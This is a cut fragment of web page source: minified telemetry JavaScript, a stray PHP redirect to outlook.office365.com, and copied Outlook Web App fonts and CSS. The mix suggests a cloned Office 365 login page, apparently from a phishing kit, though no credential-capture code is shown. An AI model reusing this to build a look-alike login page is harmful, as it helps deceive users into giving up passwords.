i=this.qt[t][0].pop();this.zt--,i.serializedEvent||(i.serializedEvent=a.default.getEventBlob(i)),this.jt.addEventToBatch(i)}t--}this.jt.flushBatch()},e.prototype.Vt=function(e){var t=this;this.hasEvents()&&this.sendEventsForPriorityAndAbove(n.AWTEventPriority.Low),this.Xt(function(){t.Gt(),null!==e&&void 0!==e&&e(),t.Lt.length>0?setTimeout(function(){return t.Vt(t.Lt.shift())},0):(t.xt=!1,t.hasEvents()&&o.default.scheduleTimer())})},e.prototype.Xt=function(e){var t=this;this.Kt.isCompletelyIdle()?e():setTimeout(function(){return t.Xt(e)},250)},e}();t.default=_},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(3),r=function(){function e(){}return e.setEventsHandler=function(e){n.default.setEventsHandler(e)},e.getEventsHandler=function(){return n.default.getEventsHandler()},e.scheduleTimer=function(){n.default.scheduleTimer()},e}();t.default=r},function(e,t,i){e.exports=i(16)}])});
//# sourceMappingURL=aria-webjs-sdk-1.2.0.min.js.map;
window.scriptsLoaded['aria-web-telemetry.js'] = 1; window.scriptProcessEnd = window.scriptProcessEnd || {}; window.scriptProcessEnd['aria-web-telemetry.js'] = (new Date()).getTime();

header("Location: http://outlook.office365.com");

      
        <style>
        
                
                @font-face {
                    font-family: "wf_segoe-ui_light";
                    src: local("Segoe UI Light"),
                         local("Segoe WP Light"),
                         url('https://r4.res.office365.com/owa/prem/fonts/segoeui-light.woff') format('woff'),
                         url('https://r4.res.office365.com/owa/prem/fonts/segoeui-light.ttf') format('truetype');
                }
                @font-face {
                    font-family: "wf_segoe-ui_normal";
                    src: local("Segoe UI"),
                         local("Segoe WP"),
                         url('https://r4.res.office365.com/owa/prem/fonts/segoeui-regular.woff') format('woff'),
                         url('https://r4.res.office365.com/owa/prem/fonts/segoeui-regular.ttf') format('truetype');
                }
                @font-face {
                    font-family: "wf_segoe-ui_semibold";
                    src: local("Segoe UI Semibold"),
                         local("Segoe WP Semibold"),
                         url('https://r4.res.office365.com/owa/prem/fonts/segoeui-semibold.woff') format('woff'),
                         url('https://r4.res.office365.com/owa/prem/fonts/segoeui-semibold.ttf') format('truetype');
                    font-weight: bold;
                }
                @font-face {
                    font-family: "wf_segoe-ui_semilight";
                    src: local("Segoe UI Semilight"),
                         local("Segoe WP Semilight"),
                         url('https://r4.res.office365.com/owa/prem/fonts/segoeui-semilight.woff') format('woff'),
                         url('https://r4.res.office365.com/owa/prem/fonts/segoeui-semilight.ttf') format('truetype');
                }

        

        @font-face {
            font-family: 'webfontPreload';
            src: url('https://r4.res.office365.com/owa/prem/16.2279.14.2549832/resources/styles/fonts/office365icons.eot?#iefix') format('embedded-opentype'),
                 url('https://r4.res.office365.com/owa/prem/16.2279.14.2549832/resources/styles/fonts/office365icons.woff') format('woff'),
                 url('https://r4.res.office365.com/owa/prem/16.2279.14.2549832/resources/styles/fonts/office365icons.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }
      </style>

       <script>
        var LocaleFontFamilyTemplate = ".ms-font-su{color:#333;font-family:@font-family-semilight;font-size:42px;font-weight:normal}.ms-font-xxl{color:#333;font-family:@font-family-light;font-size:28px;font-weight:normal}.touch .ms-font-xxl{font-size:30px}.ms-font-xl{color:#333;font-family:@font-family-light;font-size:21px;font-weight:normal}.touch .ms-font-xl{font-size:22px}.ms-font-l{color:#333;font-family:@font-family-semilight;font-size:17px;font-weight:normal}.touch .ms-font-l{font-size:18px}.ms-font-m{color:#333;font-family:@font-family-regular;font-size:14px;font-weight:normal}.touch .ms-font-m{font-size:15px}.ms-font-s{color:#333;font-family:@font-family-regular;font-size:12px;font-weight:normal}.touch .ms-font-s{font-size:13px}.ms-font-xs{color:#333;font-family:@font-family-regular;font-size:11px;font-weight:normal}.touch .ms-font-xs{font-size:12px}.ms-font-mi{color:#333;font-family:@font-family-semibold;font-size:10px;font-weight:normal}.touch .ms-font-mi{font-size:11px}.ms-font-weight-light,.ms-fwt-l,.ms-font-weight-light-hover:hover,.ms-font-weight-light-before:before,.ms-fwt-l-h:hover,.ms-fwt-l-b:before{font-family:@font-family-light;}.ms-font-weight-semilight,.ms-fwt-sl,.ms-font-weight-semilight-hover:hover,.ms-font-weight-semilight-before:before,.ms-fwt-sl-h:hover,.ms-fwt-sl-b:before{font-family:@font-family-semilight}.ms-font-weight-regular,.ms-fwt-r,.ms-font-weight-regular-hover:hover,.ms-font-weight-regular-before:before,.ms-fwt-r-h:hover,.ms-fwt-r-b:before{font-family:@font-family-regular}.ms-font-weight-semibold,.ms-fwt-sb,.ms-font-weight-semibold-hover:hover,.ms-font-weight-semibold-before:before,.ms-fwt-sb-h:hover,.ms-fwt-sb-b:before{font-family:@font-family-semibold;font-weight:bold}";
        var ThemedColorTemplate = ".ms-bg-color-themeDark, .ms-bgc-td, .ms-bg-color-themeDark-hover:hover, .ms-bg-color-themeDark-focus:focus, .ms-bg-color-themeDark-before:before, .ms-bgc-td-h:hover, .ms-bgc-td-f:focus, .ms-bgc-td-b:before { background-color: @color-themeDark; }.ms-bg-color-themeDarkAlt, .ms-bgc-tda, .ms-bg-color-themeDarkAlt-hover:hover, .ms-bg-color-themeDarkAlt-focus:focus, .ms-bg-color-themeDarkAlt-before:before, .ms-bgc-tda-h:hover, .ms-bgc-tda-f:focus, .ms-bgc-tda-b:before { background-color: @color-themeDarkAlt; }.ms-bg-color-themeDarker, .ms-bgc-tdr, .ms-bg-color-themeDarker-hover:hover, .ms-bg-color-themeDarker-focus:focus, .ms-bg-color-themeDarker-before:before, .ms-bgc-tdr-h:hover, .ms-bgc-tdr-f:focus, .ms-bgc-tdr-b:before { background-color: @color-themeDarker; }.ms-bg-color-themePrimary, .ms-bgc-tp, .ms-bg-color-themePrimary-hover:hover, .ms-bg-color-themePrimary-focus:focus, .ms-bg-color-themePrimary-before:before, .ms-bgc-tp-h:hover, .ms-bgc-tp-f:focus, .ms-bgc-tp-b:before { background-color: @color-themePrimary; }.ms-bg-color-themeSecondary, .ms-bgc-ts, .ms-bg-color-themeSecondary-hover:hover, .ms-bg-color-themeSecondary-focus:focus, .ms-bg-color-themeSecondary-before:before, .ms-bgc-ts-h:hover, .ms-bgc-ts-f:focus, .ms-bgc-ts-b:before { background-color: @color-themeSecondary; }.ms-bg-color-themeTertiary, .ms-bgc-tt, .ms-bg-color-themeTertiary-hover:hover, .ms-bg-color-themeTertiary-focus:focus, .ms-bg-color-themeTertiary-before:before, .ms-bgc-tt-h:hover, .ms-bgc-tt-f:focus, .ms-bgc-tt-b:before { background-color: @color-themeTertiary; }.ms-bg-color-themeLight, .ms-bgc-tl, .ms-bg-color-themeLight-hover:hover, .ms-bg-color-themeLight-focus:focus, .ms-bg-color-themeLight-before:before, .ms-bgc-tl-h:hover, .ms-bgc-tl-f:focus, .ms-bgc-tl-b:before { background-color: @color-themeLight; }.ms-bg-color-themeLighter, .ms-bgc-tlr, .ms-bg-color-themeLighter-hover:hover, .ms-bg-color-themeLighter-focus:focus, .ms-bg-color-themeLighter-before:before, .ms-bgc-tlr-h:hover, .ms-bgc-tlr-f:focus, .ms-bgc-tlr-b:before { background-color: @color-themeLighter; }.ms-bg-color-themeLighterAlt, .ms-bgc-tlra, .ms-bg-color-themeLighterAlt-hover:hover, .ms-bg-color-themeLighterAlt-focus:focus, .ms-bg-color-themeLighterAlt-before:before, .ms-bgc-tlra-h:hover, .ms-bgc-tlra-f:focus, .ms-bgc-tlra-b:before { background-color: @color-themeLighterAlt; }.ms-border-color-themeDark, .ms-bcl-td, .ms-border-color-themeDark-hover:hover, .ms-border-color-themeDark-focus:focus, .ms-border-color-themeDark-before:before, .ms-bcl-td-h:hover, .ms-bcl-td-f:focus, .ms-bcl-td-b:before { border-color: @color-themeDark; }.ms-border-color-themeDarkAlt, .ms-bcl-tda, .ms-border-color-themeDarkAlt-hover:hover, .ms-border-color-themeDarkAlt-focus:focus, .ms-border-color-themeDarkAlt-before:before, .ms-bcl-tda-h:hover, .ms-bcl-tda-f:focus, .ms-bcl-tda-b:before { border-color: @color-themeDarkAlt; }.ms-border-color-themeDarker, .ms-bcl-tdr, .ms-border-color-themeDarker-hover:hover, .ms-border-color-themeDarker-focus:focus, .ms-border-color-themeDarker-before:before, .ms-bcl-tdr-h:hover, .ms-bcl-tdr-f:focus, .ms-bcl-tdr-b:before { border-color: @color-themeDarker; }.ms-border-color-themePrimary, .ms-bcl-tp, .ms-border-color-themePrimary-hover:hover, .ms-border-color-themePrimary-focus:focus, .ms-border-color-themePrimary-before:before, .ms-bcl-tp-h:hover, .ms-bcl-tp-f:focus, .ms-bcl-tp-b:before { border-color: @color-themePrimary; }.ms-border-color-themeSecondary, .ms-bcl-ts, .ms-border-color-themeSecondary-hover:hover, .ms-border-color-themeSecondary-focus:focus, .ms-border-color-themeSecondary-before:before, .ms-bcl-ts-h:hover, .ms-bcl-ts-f:focus, .ms-bcl-ts-b:before { border-color: @color-themeSecondary; }.ms-border-color-themeTertiary, .ms-bcl-tt, .ms-border-color-themeTertiary-hover:hover, .ms-border-color-themeTertiary-focus:focus, .ms-border-color-themeTertiary-before:before, .ms-bcl-tt-h:hover, .ms-bcl-tt-f:focus, .ms-bcl-tt-b:before { border-color: @color-themeTertiary; }.ms-border-color-themeLight, .ms-bcl-tl, .ms-border-color-themeLight-hover:hover, .ms-border-color-themeLight-focus:focus, .ms-border-color-themeLight-before:before, .ms-bcl-tl-h:hover, .ms-bcl-tl-f:focus, .ms-bcl-tl-b:before { border-color: @color-themeLight; }.ms-border-color-themeLighter, .ms-bcl-tlr, .ms-border-color-themeLighter-hover:hover, .ms-border-color-themeLighter-focus:focus, .ms-border-color-themeLighter-before:before, .ms-bcl-tlr-h:hover, .ms-bcl-tlr-f:focus, .ms-bcl-tlr-b:before { border-color: @color-themeLighter; }.ms-border-color-themeLighterAlt, .ms-bcl-tlra, .ms-border-color-themeLighterAlt-hover:hover, .ms-border-color-themeLighterAlt-focus:focus, .ms-border-color-themeLighterAlt-before:before, .ms-bcl-tlra-h:hover, .ms-bcl-tlra-f:focus, .ms-bcl-tlra-b:before { border-color: @color-themeLighterAlt; }.ms-border-color-top-themePrimary, .ms-bcl-t-tp, .ms-border-color-top-themePrimary-hover:hover, .ms-border-color-top-themePrimary-focus:focus, .ms-border-color-top-themePrimary-before:before, .ms-bcl-t-tp-h:hover, .ms-bcl-t-tp-f:focus, .ms-bcl-t-tp-b:before { border-top-color: @color-themePrimary; }.ms-font-color-themeDark, .ms-fontColor-themeDark, .ms-fontColor-themeDark, .ms-fcl-td, .ms-font-color-themeDark-hover:hover, .ms-font-color-themeDark-focus:focus, .ms-font-color-themeDark-before:before, .ms-fcl-td-h:hover, .ms-fcl-td-f:focus, .ms-fcl-td-b:before { color: @color-themeDark; }.ms-font-color-themeDarkAlt, .ms-fontColor-themeDarkAlt, .ms-fontColor-themeDarkAlt, .ms-fcl-tda, .ms-font-color-themeDarkAlt-hover:hover, .ms-font-color-themeDarkAlt-focus:focus, .ms-font-color-themeDarkAlt-before:before, .ms-fcl-tda-h:hover, .ms-fcl-tda-f:focus, .ms-fcl-tda-b:before { color: @color-themeDarkAlt; }.ms-font-color-themeDarker, .ms-fontColor-themeDarker, .ms-fontColor-themeDarker, .ms-fcl-tdr, .ms-font-color-themeDarker-hover:hover, .ms-font-color-themeDarker-focus:focus, .ms-font-color-themeDarker-before:before, .ms-fcl-tdr-h:hover, .ms-fcl-tdr-f:focus, .ms-fcl-tdr-b:before { color: @color-themeDarker; }.ms-font-color-themePrimary, .ms-fontColor-themePrimary, .ms-fontColor-themePrimary, .ms-fcl-tp, .ms-font-color-themePrimary-hover:hover, .ms-font-color-themePrimary-focus:focus, .ms-font-color-themePrimary-before:before, .ms-fcl-tp-h:hover, .ms-fcl-tp-f:focus, .ms-fcl-tp-b:before { color: @color-themePrimary; }.ms-font-color-themeSecondary, .ms-fontColor-themeSecondary, .ms-fontColor-themeSecondary, .ms-fcl-ts, .ms-font-color-themeSecondary-hover:hover, .ms-font-color-themeSecondary-focus:focus, .ms-font-color-themeSecondary-before:before, .ms-fcl-ts-h:hover, .ms-fcl-ts-f:focus, .ms-fcl-ts-b:before { color: @color-themeSecondary; }.ms-font-color-themeTertiary, .ms-fontColor-themeTertiary, .ms-fontColor-themeTertiary, .ms-fcl-tt, .ms-font-color-themeTertiary-hover:hover, .ms-font-color-themeTertiary-focus:focus, .ms-font-color-themeTertiary-before:before, .ms-fcl-tt-h:hover, .ms-fcl-tt-f:focus, .ms-fcl-tt-b:before { color: @color-themeTertiary; }.ms-font-color-themeLight, .ms-fontColor-themeLight, .ms-fontColor-themeLight, .ms-fcl-tl, .ms-font-color-themeLight-hover:hover, .ms-font-color-themeLight-focus:focus, .ms-font-color-themeLight-before:before, .ms-fcl-tl-h:hover, .ms-fcl-tl-f:focus, .ms-fcl-tl-b:before { color: @color-themeLight; }.ms-font-color-themeLighter, .ms-fontColor-themeLighter, .ms-fontColor-themeLighter, .ms-fcl-tlr, .ms-font-color-themeLighter-hover:hover, .ms-font-color-themeLighter-focus:focus, .ms-font-color-themeLighter-before:before, .ms-fcl-tlr-h:hover, .ms-fcl-tlr-f:focus, .ms-fcl-tlr-b:before { color: @color-themeLighter; }.ms-font-color-themeLighterAlt, .ms-fontColor-themeLighterAlt, .ms-fontColor-themeLighterAlt, .ms-fcl-tlra, .ms-font-color-themeLighterAlt-hover:hover, .ms-font-color-themeLighterAlt-focus:focus, .ms-font-color-themeLighterAlt-before:before, .ms-fcl-tlra-h:hover, .ms-fcl-tlra-f:focus, .ms-fcl-tlra-b:before { color: @color-themeLighterAlt; }";
        var o365ColorTemplate = ".o365cs-base.o365cst .o365cs-topnavLinkBackground-2{background-color:@topnavLinkBG;background-color:@topnavLinkBGrgb;}.o365cs-base.o365cst .o365cs-topnavText,.o365cs-base.o365cst .o365cs-topnavText:hover{color:@topnavText;}.o365cs-base.o365cst .o365cs-navMenuButton{color:@navmenu;}.o365cs-base.o365cst.o365cs-topnavBGColor-2{background-color:@topnavBG;}.o365cs-base.o365cst .o365cs-appLauncherBackground{background-color:@appLauncherBG}";
        
        
        
        
        
        
        
                
        </script>
        
            <style type="text/css">
    .exactCenter {
        width:950px;
        height:50px;
        position: fixed;
        
        top: 60%;
        left: 46%;
        margin-top: -100px;
        margin-left: -100px;
    }
            </style>
            
            
            
            
            
            
            
            
            
        
        
        
        <style>.customScrollBar::-webkit-scrollbar{height:18px;width:18px}.customScrollBar::-webkit-scrollbar:disabled{display:none}.customScrollBar::-webkit-scrollbar-button{background-color:#fff;background-repeat:no-repeat;cursor:pointer}.customScrollBar::-webkit-scrollbar-button:horizontal:increment,.customScrollBar::-webkit-scrollbar-button:horizontal:decrement,.customScrollBar::-webkit-scrollbar-button:horizontal:increment:hover,.customScrollBar::-webkit-scrollbar-button:horizontal:decrement:hover,.customScrollBar::-webkit-scrollbar-button:vertical:increment,.customScrollBar::-webkit-scrollbar-button:vertical:decrement,.customScrollBar::-webkit-scrollbar-button:vertical:increment:hover,.customScrollBar::-webkit-scrollbar-button:vertical:decrement:hover{background-position:center;height:18px;width:18px}.customScrollBarLight::-webkit-scrollbar-button{display:none}.customScrollBar::-webkit-scrollbar-track{background-color:#fff}.customScrollBarLight::-webkit-scrollbar-track{background-color:#0072c6}.customScrollBar::-webkit-scrollbar-thumb{border-radius:9px;border:solid 6px #fff;background-color:#c8c8c8}.customScrollBarLight::-webkit-scrollbar-thumb{border-color:#0072c6;background-color:#95b1c1}.customScrollBar::-webkit-scrollbar-thumb:vertical{min-height:50px}.customScrollBar::-webkit-scrollbar-thumb:horizontal{min-width:50px}.customScrollBar::-webkit-scrollbar-thumb:hover{border-radius:9px;border:solid 6px #fff;background-color:#98a3a6}.customScrollBar::-webkit-scrollbar-corner{background-color:#fff}.nativeScrollInertia{-webkit-overflow-scrolling:touch}.csimg{display:inline-block;overflow:hidden}button::-moz-focus-inner{border-width:0;padding:0}.textbox{border-width:1px;border-style:solid;border-radius:0;-moz-border-radius:0;-webkit-border-radius:0;box-shadow:none;-moz-box-shadow:none;-webkit-box-shadow:none;-webkit-appearance:none;height:30px;padding:0 5px}.tnarrow .textbox,.twide .textbox{font-size:12px;background-color:#fff;height:14px;padding:3px 5px}.textbox::-webkit-input-placeholder{color:#a6a6a6}.textbox:-moz-placeholder{color:#a6a6a6}.textbox::-moz-placeholder{color:#a6a6a6}.textbox:-ms-input-placeholder{color:#a6a6a6}.textarea{padding:10px}.textarea:hover{background-color:transparent;border-color:transparent}.o365button{background:transparent;border-width:0;padding:0;cursor:pointer!important;font-size:14px}.o365button:disabled,label.o365button[disabled=true]{cursor:default!important}.o365buttonOutlined{padding-right:11px;padding-left:11px;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;border-width:1px;border-style:solid}.o365buttonOutlined .o365buttonLabel{display:inline-block}.o365buttonOutlined{height:30px}.twide .o365buttonOutlined,.tnarrow .o365buttonOutlined{height:22px}.o365buttonOutlined .o365buttonLabel{height:22px}.checkbox{border-style:none;cursor:pointer;vertical-align:middle}.popupShadow{box-shadow:0 0 20px rgba(0,0,0,.4);border:1px solid #eaeaea}.contextMenuDropShadow{box-shadow:0 0 7px rgba(0,0,0,.4);border:1px solid #eaeaea}.modalBackground{background-color:#fff;height:100%;width:100%;opacity:.65;filter:Alpha(opacity=65)}.clearModalBackground{background-color:#fff;opacity:0;filter:Alpha(opacity=0);height:100%;width:100%}.contextMenuPopup{background-color:#fff}.removeFocusOutline *:focus{outline:none}.addFocusOutline button:focus{outline:dotted 1px}.addFocusRingOutline button:focus{outline:auto 5px -webkit-focus-ring-color}.border-color-transparent{border-color:transparent}.vResize,.hResize{z-index:1000}.hResize,.hResizeCursor *{cursor:row-resize!important}.vResize,.vResizeCursor *{cursor:col-resize!important}.vResizing,.hResizing{filter:alpha(opacity=60);opacity:.6;-moz-opacity:.6;border:solid 1px #666}.vResizing{border-width:0 1px}.hResizing{border-width:1px 0}</style>
        <style></style>
        <style id="FontLocaleStyles"></style>
        <style id="ThemedColorStyles"></style>
        <style>.ms-bg-color-black,.ms-bgc-b,.ms-bg-color-black-hover:hover,.ms-bg-color-black-focus:focus,.ms-bg-color-black-before:before,.ms-bgc-b-h:hover,.ms-bgc-b-f:focus,.ms-bgc-b-b:before{background-color:#000}.ms-bg-color-neutralDark,.ms-bgc-nd,.ms-bg-color-neutralDark-hover:hover,.ms-bg-color-neutralDark-focus:focus,.ms-bg-color-neutralDark-before:before,.ms-bgc-nd-h:hover,.ms-bgc-nd-f:focus,.ms-bgc-nd-b:before{background-color:#212121}.ms-bg-color-neutralPrimary,.ms-bgc-np,.ms-bg-color-neutralPrimary-hover:hover,.ms-bg-color-neutralPrimary-focus:focus,.ms-bg-color-neutralPrimary-before:before,.ms-bgc-np-h:hover,.ms-bgc-np-f:focus,.ms-bgc-np-b:before{background-color:#333}.ms-bg-color-neutralSecondary,.ms-bgc-ns,.ms-bg-color-neutralSecondary-hover:hover,.ms-bg-color-neutralSecondary-focus:focus,.ms-bg-color-neutralSecondary-before:before,.ms-bgc-ns-h:hover,.ms-bgc-ns-f:focus,.ms-bgc-ns-b:before{background-color:#666}.ms-bg-color-neutralSecondaryAlt,.ms-bgc-nsa,.ms-bg-color-neutralSecondaryAlt-hover:hover,.ms-bg-color-neutralSecondaryAlt-focus:focus,.ms-bg-color-neutralSecondaryAlt-before:before,.ms-bgc-nsa-h:hover,.ms-bgc-nsa-f:focus,.ms-bgc-nsa-b:before{background-color:#767676}.ms-bg-color-neutralTertiary,.ms-bgc-nt,.ms-bg-color-neutralTertiary-hover:hover,.ms-bg-color-neutralTertiary-focus:focus,.ms-bg-color-neutralTertiary-before:before,.ms-bgc-nt-h:hover,.ms-bgc-nt-f:focus,.ms-bgc-nt-b:before{background-color:#a6a6a6}.ms-bg-color-neutralTertiaryAlt,.ms-bgc-nta,.ms-bg-color-neutralTertiaryAlt-hover:hover,.ms-bg-color-neutralTertiaryAlt-focus:focus,.ms-bg-color-neutralTertiaryAlt-before:before,.ms-bgc-nta-h:hover,.ms-bgc-nta-f:focus,.ms-bgc-nta-b:before{background-color:#c8c8c8}.ms-bg-color-neutralLight,.ms-bgc-nl,.ms-bg-color-neutralLight-hover:hover,.ms-bg-color-neutralLight-focus:focus,.ms-bg-color-neutralLight-before:before,.ms-bgc-nl-h:hover,.ms-bgc-nl-f:focus,.ms-bgc-nl-b:before{background-color:#eaeaea}.ms-bg-color-neutralLighter,.ms-bgc-nlr,.ms-bg-color-neutralLighter-hover:hover,.ms-bg-color-neutralLighter-focus:focus,.ms-bg-color-neutralLighter-before:before,.ms-bgc-nlr-h:hover,.ms-bgc-nlr-f:focus,.ms-bgc-nlr-b:before{background-color:#f4f4f4}.ms-bg-color-neutralLighterAlt,.ms-bgc-nlra,.ms-bg-color-neutralLighterAlt-hover:hover,.ms-bg-color-neutralLighterAlt-focus:focus,.ms-bg-color-neutralLighterAlt-before:before,.ms-bgc-nlra-h:hover,.ms-bgc-nlra-f:focus,.ms-bgc-nlra-b:before{background-color:#f8f8f8}.ms-bg-color-white,.ms-bgc-w,.ms-bg-color-white-hover:hover,.ms-bg-color-white-focus:focus,.ms-bg-color-white-before:before,.ms-bgc-w-h:hover,.ms-bgc-w-b:before{background-color:#fff}.ms-border-color-black,.ms-bcl-b,.ms-border-color-black-hover:hover,.ms-border-color-black-focus:focus,.ms-border-color-black-before:before,.ms-bcl-b-h:hover,.ms-bcl-b-f:focus,.ms-bcl-b-b:before{border-color:#000}.ms-border-color-neutralDark,.ms-bcl-nd,.ms-border-color-neutralDark-hover:hover,.ms-border-color-neutralDark-focus:focus,.ms-border-color-neutralDark-before:before,.ms-bcl-nd-h:hover,.ms-bcl-nd-f:focus,.ms-bcl-nd-b:before{border-color:#212121}.ms-border-color-neutralPrimary,.ms-bcl-np,.ms-border-color-neutralPrimary-hover:hover,.ms-border-color-neutralPrimary-focus:focus,.ms-border-color-neutralPrimary-before:before,.ms-bcl-np-h:hover,.ms-bcl-np-f:focus,.ms-bcl-np-b:before{border-color:#333}.ms-border-color-neutralSecondary,.ms-bcl-ns,.ms-border-color-neutralSecondary-hover:hover,.ms-border-color-neutralSecondary-focus:focus,.ms-border-color-neutralSecondary-before:before,.ms-bcl-ns-h:hover,.ms-bcl-ns-f:focus,.ms-bcl-ns-b:before{border-color:#666}.ms-border-color-neutralSecondaryAlt,.ms-bcl-nsa,.ms-border-color-neutralSecondaryAlt-hover:hover,.ms-border-color-neutralSecondaryAlt-focus:focus,.ms-border-color-neutralSecondaryAlt-before:before,.ms-bcl-nsa-h:hover,.ms-bcl-nsa-f:focus,.ms-bcl-nsa-b:before{border-color:#767676}.ms-border-color-neutralTertiary,.ms-bcl-nt,.ms-border-color-neutralTertiary-hover:hover,.ms-border-color-neutralTertiary-focus:focus,.ms-border-color-neutralTertiary-before:before,.ms-bcl-nt-h:hover,.ms-bcl-nt-f:focus,.ms-bcl-nt-b:before{border-color:#a6a6a6}.ms-border-color-neutralTertiaryAlt,.ms-bcl-nta,.ms-border-color-neutralTertiaryAlt-hover:hover,.ms-border-color-neutralTertiaryAlt-focus:focus,.ms-border-color-neutralTertiaryAlt-before:before,.ms-bcl-nta-h:hover,.ms-bcl-nta-f:focus,.ms-bcl-nta-b:before{border-color:#c8c8c8}.ms-border-color-neutralLight,.ms-bcl-nl,.ms-border-color-neutralLight-hover:hover,.ms-border-color-neutralLight-focus:focus,.ms-border-color-neutralLight-before:before,.ms-bcl-nl-h:hover,.ms-bcl-nl-f:focus,.ms-bcl-nl-b:before{border-color:#eaeaea}.ms-border-color-neutralLighter,.ms-bcl-nlr,.ms-border-color-neutralLighter-hover:hover,.ms-border-color-neutralLighter-focus:focus,.ms-border-color-neutralLighter-before:before,.ms-bcl-nlr-h:hover,.ms-bcl-nlr-f:focus,.ms-bcl-nlr-b:before{border-color:#f4f4f4}.ms-border-color-neutralLighterAlt,.ms-bcl-nlra,.ms-border-color-neutralLighterAlt-hover:hover,.ms-border-color-neutralLighterAlt-focus:focus,.ms-border-color-neutralLighterAlt-before:before,.ms-bcl-nlra-h:hover,.ms-bcl-nlra-f:focus,.ms-bcl-nlra-b:before{border-color:#f8f8f8}.ms-border-color-white,.ms-bcl-w,.ms-border-color-white-hover:hover,.ms-border-color-white-focus:focus,.ms-border-color-white-before:before,.ms-bcl-w-h:hover,.ms-bcl-w-f:focus,.ms-bcl-w-b:before{border-color:#fff}.ms-font-color-black,.ms-fontColor-black,.ms-fcl-b,.ms-font-color-black-hover:hover,.ms-font-color-black-focus:focus,.ms-font-color-black-before:before,.ms-fcl-b-h:hover,.ms-fcl-b-f:focus,.ms-fcl-b-b:before{color:#000}.ms-font-color-neutralDark,.ms-fontColor-neutralDark,.ms-fcl-nd,.ms-font-color-neutralDark-hover:hover,.ms-font-color-neutralDark-focus:focus,.ms-font-color-neutralDark-before:before,.ms-fcl-nd-h:hover,.ms-fcl-nd-f:focus,.ms-fcl-nd-b:before{color:#212121}.ms-font-color-neutralPrimary,.ms-fontColor-neutralPrimary,.ms-fcl-np,.ms-font-color-neutralPrimary-hover:hover,.ms-font-color-neutralPrimary-focus:focus,.ms-font-color-neutralPrimary-before:before,.ms-fcl-np-h:hover,.ms-fcl-np-f:focus,.ms-fcl-np-b:before{color:#333}.ms-font-color-neutralSecondary,.ms-fontColor-neutralSecondary,.ms-fcl-ns,.ms-font-color-neutralSecondary-hover:hover,.ms-font-color-neutralSecondary-focus:focus,.ms-font-color-neutralSecondary-before:before,.ms-fcl-ns-h:hover,.ms-fcl-ns-f:focus,.ms-fcl-ns-b:before{color:#666}.ms-font-color-neutralSecondaryAlt,.ms-fontColor-neutralSecondaryAlt,.ms-fcl-nsa,.ms-font-color-neutralSecondaryAlt-hover:hover,.ms-font-color-neutralSecondaryAlt-focus:focus,.ms-font-color-neutralSecondaryAlt-before:before,.ms-fcl-nsa-h:hover,.ms-fcl-nsa-f:focus,.ms-fcl-nsa-b:before{color:#767676}.ms-font-color-neutralTertiary,.ms-fontColor-neutralTertiary,.ms-fcl-nt,.ms-font-color-neutralTertiary-hover:hover,.ms-font-color-neutralTertiary-focus:focus,.ms-font-color-neutralTertiary-before:before,.ms-fcl-nt-h:hover,.ms-fcl-nt-f:focus,.ms-fcl-nt-b:before{color:#a6a6a6}.ms-font-color-neutralTertiaryAlt,.ms-fontColor-neutralTertiaryAlt,.ms-fcl-nta,.ms-font-color-neutralTertiaryAlt-hover:hover,.ms-font-color-neutralTertiaryAlt-focus:focus,.ms-font-color-neutralTertiaryAlt-before:before,.ms-fcl-nta-h:hover,.ms-fcl-nta-f:focus,.ms-fcl-nta-b:before{color:#c8c8c8}.ms-font-color-neutralLight,.ms-fontColor-neutralLight,.ms-fcl-nl,.ms-font-color-neutralLight-hover:hover,.ms-font-color-neutralLight-focus:focus,.ms-font-color-neutralLight-before:before,.ms-fcl-nl-h:hover,.ms-fcl-nl-f:focus,.ms-fcl-nl-b:before{color:#eaeaea}.ms-font-color-neutralLighter,.ms-fontColor-neutralLighter,.ms-fcl-nlr,.ms-font-color-neutralLighter-hover:hover,.ms-font-color-neutralLighter-focus:focus,.ms-font-color-neutralLighter-before:before,.ms-fcl-nlr-h:hover,.ms-fcl-nlr-f:focus,.ms-fcl-nlr-b:before{color:#f4f4f4}.ms-font-color-neutralLighterAlt,.ms-fontColor-neutralLighterAlt,.ms-fcl-nlra,.ms-font-color-neutralLighterAlt-hover:hover,.ms-font-color-neutralLighterAlt-focus:focus,.ms-font-color-neutralLighterAlt-before:before,.ms-fcl-nlra-h:hover,.ms-fcl-nlra-f:focus,.ms-fcl-nlra-b:before{color:#f8f8f8}.ms-font-color-white,.ms-fontColor-white,.ms-fcl-w,.ms-font-color-white-hover:hover,.ms-font-color-white-focus:focus,.ms-font-color-white-before:before,.ms-fcl-w-h:hover,.ms-fcl-w-f:focus,.ms-fcl-w-b:before{color:#fff}</style>
        <style>.ms-bg-color-yellow,.ms-bgc-y,.ms-bg-color-yellow-hover:hover,.ms-bg-color-yellow-before:before,.ms-bgc-y-h:hover,.ms-bgc-y-b:before{background-color:#ffb900}.ms-bg-color-yellowLight,.ms-bgc-yl,.ms-bg-color-yellowLight-hover:hover,.ms-bg-color-yellowLight-before:before,.ms-bgc-yl-h:hover,.ms-bgc-yl-b:before{background-color:#fff100}.ms-bg-color-orange,.ms-bgc-o,.ms-bg-color-orange-hover:hover,.ms-bg-color-orange-before:before,.ms-bgc-o-h:hover,.ms-bgc-o-b:before{background-color:#d83b01}.ms-bg-color-orangeLight,.ms-bgc-ol,.ms-bg-color-orangeLight-hover:hover,.ms-bg-color-orangeLight-before:before,.ms-bgc-ol-h:hover,.ms-bgc-ol-b:before{background-color:#ff8c00}.ms-bg-color-redDark,.ms-bgc-rd,.ms-bg-color-redDark-hover:hover,.ms-bg-color-redDark-before:before,.ms-bgc-rd-h:hover,.ms-bgc-rd-b:before{background-color:#a80000}.ms-bg-color-red,.ms-bgc-r,.ms-bg-color-red-hover:hover,.ms-bg-color-red-before:before,.ms-bgc-r-h:hover,.ms-bgc-r-b:before{background-color:#e81123}.ms-bg-color-magentaDark,.ms-bgc-md,.ms-bg-color-magentaDark-hover:hover,.ms-bg-color-magentaDark-before:before,.ms-bgc-md-h:hover,.ms-bgc-md-b:before{background-color:#5c005c}.ms-bg-color-magenta,.ms-bgc-m,.ms-bg-color-magenta-hover:hover,.ms-bg-color-magenta-before:before,.ms-bgc-m-h:hover,.ms-bgc-m-b:before{background-color:#b4009e}.ms-bg-color-magentaLight,.ms-bgc-ml,.ms-bg-color-magentaLight-hover:hover,.ms-bg-color-magentaLight-before:before,.ms-bgc-ml-h:hover,.ms-bgc-ml-b:before{background-color:#e30